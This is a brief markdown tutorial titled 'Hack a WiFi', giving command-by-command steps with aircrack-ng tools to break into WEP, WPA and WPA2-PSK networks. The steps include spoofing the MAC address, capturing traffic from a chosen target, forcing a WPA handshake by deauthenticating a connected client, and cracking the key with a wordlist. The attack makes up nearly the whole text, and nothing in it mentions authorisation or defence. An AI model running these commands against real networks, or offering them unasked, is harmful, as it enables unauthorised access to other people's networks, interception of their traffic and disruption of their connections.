Hack a WiFi (WEP/WPA/WPA2-PSK) network
======================================


Applications
------------

- aircrack-ng
http://www.aircrack-ng.org/
- macchanger
http://www.alobbs.com/macchanger/
- big wordlist of your choice, eg
http://www.openwall.com/wordlists/


Preparation
-----------

List network interfaces

	# iwconfig

Shut down and set interface to monitor mode

	# ifconfig <INTERFACE> down
	# iwconfig <INTERFACE> mode monitor

Switch MAC address (6 bytes) and activate

	# macchanger --mac <MAC>
	# ifconfig <INTERFACE> up

Scan the air for target

	# airodump-ng <iNTERFACE>

Get BSSID, ESSID and channel
Switch interface to monitor mode and target channel

	# ifconfig <INTERFACE> down
	# iwconfig <INTERFACE> mode managed
	# iwconfig <INTERFACE> channel <CHANNEL/FREQ>
	# ifconfig <INTERFACE> down
	# iwconfig <INTERFACE> mode monitor
	# ifconfig <INTERFACE> up

Verify wifi channel and monitor mode

	Channel 1:	2.412Ghz
	Channel 2:	2.417Ghz
	Channel 3:	2.422Ghz
	...

	# iwconfig <INTERFACE>


Capturing data
--------------

Scan, log and save

	# airodump-ng --channel <CHANNEL> --write <OUTPUTNAME> --bssid <BSSID> <INTERFACE>


Fakeauth, arpreply and de-auth
------------------------------

### WEP

Associate with AP using standard WEP. This does not work on WPA/WPA2.

	# aireplay-ng --fakeauth 0 -a <BSSID> -h <MAC> -e <ESSID> <INTERFACE>

If successful, increase traffic to collect more data (optional)

	# aireplay-ng --arpreplay -b <BSSID> -h <MAC> <INTERFACE>

If ARP count slows down, keep reassociate


### WPA(2)

Need only one valid handshake for offline dictionary attack

Force it by de-auth an already associated client

	# aireplay-ng --deauth 3 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>


Crack password
--------------

### WEP

If enough data - crack the cap(ture) file

	# aircrack-ng -b <BSSID> <OUTPUTNAME>*.cap

### WPA(2)

Need only a valid handshake and a big wordlist.
If you have both, go ahead:

	# aircrack-ng -w <WORDLISTFILE> <OUTPUTNAME>*.cap

Done.

---

*Written by Prodhe*
